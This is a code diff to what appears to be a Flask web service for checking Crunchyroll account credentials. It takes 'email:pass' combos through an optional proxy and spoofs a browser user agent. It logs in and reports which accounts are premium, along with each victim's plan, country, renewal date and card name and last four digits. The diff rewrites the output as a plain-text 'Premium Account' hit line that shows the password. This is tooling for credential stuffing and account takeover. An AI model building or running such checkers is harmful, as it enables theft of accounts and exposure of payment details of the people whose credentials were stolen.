@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request
 import requests
 from urllib.parse import quote
 from datetime import datetime
@@ -53,12 +53,7 @@ def format_proxy(proxy_string):
     return None
 
 def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
-    """
-    Use this to get extra Crunchyroll details using web API, after you already have access_token.
-    Returns dict with plan, payment, country, trial, status, renewal, days_left, etc.
-    """
     UA = ua or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36"
-    # Get user id for web API
     me_headers = {
         "User-Agent": UA,
         "Authorization": f"Bearer {token}",
@@ -107,7 +102,7 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
 
     subscriptions = data.get("subscriptions", [])
     plan_text = plan_value = active_free_trial = next_renewal_date = status = "N/A"
-    payment_info = country_code = "N/A"
+    payment_info = country_code = payment_method_type = "N/A"
 
     if subscriptions:
         plan = subscriptions[0].get("plan", {})
@@ -125,12 +120,22 @@ def extract_crunchyroll_account_details(session, token, proxies=None, ua=None):
         payment_last4 = payment.get("lastFour", "")
         country_code = payment.get("countryCode", "N/A")
         if payment_type == "credit_card" and payment_name and payment_last4:
-            payment_info = f"{payment_name} ending in {payment_last4}"
+            payment_info = f"{payment_name} ending in {payment_last4} ({payment_type})"
+        elif payment_name and payment_type and payment_last4:
+            payment_info = f"{payment_name} ending in {payment_last4} ({payment_type})"
+        elif payment_name and payment_type:
+            payment_info = f"{payment_name} ({payment_type})"
+        elif payment_name:
+            payment_info = payment_name
+        elif payment_type:
+            payment_info = payment_type
         else:
-            payment_info = payment_name or payment_type or "N/A"
+            payment_info = "N/A"
+        payment_method_type = payment_type
     else:
         payment_info = "N/A"
         country_code = "N/A"
+        payment_method_type = "N/A"
 
     if next_renewal_date not in ["N/A", "None"]:
         try:
@@ -295,13 +300,10 @@ def crunchyroll_check(email, password, proxy=None):
         else:
             message = "Invalid or Free Account"
 
-        # -------- Extract Web Details ---------
         web_details = extract_crunchyroll_account_details(session, token, proxies=proxies, ua=UA)
-        # --------------------------------------
-
         return email, password, message, plan, amount, expiry, web_details
     except Exception as ex:
-        return email, password, f"Unknown Error: {ex}", plan, amount, expiry, web_details
+        return email, password, f"Unknown Error: {ex}", plan, amount, expiry, {}
 
 @app.route("/check", methods=["GET", "POST"])
 def check():
@@ -309,22 +311,37 @@ def check():
     proxy = request.values.get("proxy", "")
 
     if ":" not in combo or not combo:
-        return jsonify({"status": "error", "message": "Use ?email=email:pass&proxy=proxy (proxy optional)"}), 400
+        return "❌ Use ?email=email:pass&proxy=proxy (proxy optional)", 400
     email, password = combo.split(":", 1)
     if not email or not password:
-        return jsonify({"status": "error", "message": "Missing email or password"}), 400
+        return "❌ Missing email or password", 400
 
     email, password, message, plan, amount, expiry, web_details = crunchyroll_check(email, password, proxy if proxy else None)
-    resp = {
-        "email": email,
-        "pass": password,
-        "message": message,
-        "plan": plan,
-        "amount": amount,
-        "expiry": expiry,
-    }
-    resp.update(web_details)
-    return jsonify(resp)
+
+    # Which details to use (web or mobile)
+    display_plan = web_details.get("web_plan", plan)
+    display_payment = web_details.get("web_payment", "N/A")
+    display_country = web_details.get("web_country", "N/A")
+    display_trial = "True" if web_details.get("web_trial", "False") == "True" else "False"
+    display_status = web_details.get("web_status", "N/A")
+    display_renewal = web_details.get("web_renewal", expiry)
+    display_days = web_details.get("web_days_left", "N/A")
+
+    if display_plan.lower() == "free":
+        return f"❎ {email}:{password} - Free Account", 200, {"Content-Type": "text/plain"}
+
+    resp_str = f"""✅ Premium Account
+
+Account: {email}:{password}
+Country: {display_country}
+Plan: {display_plan}
+Payment: {display_payment}
+Trial: {display_trial}
+Status: {display_status}
+Renewal: {display_renewal}
+Days Left: {display_days}
+"""
+    return resp_str, 200, {"Content-Type": "text/plain"}
 
 @app.route("/")
 def home():
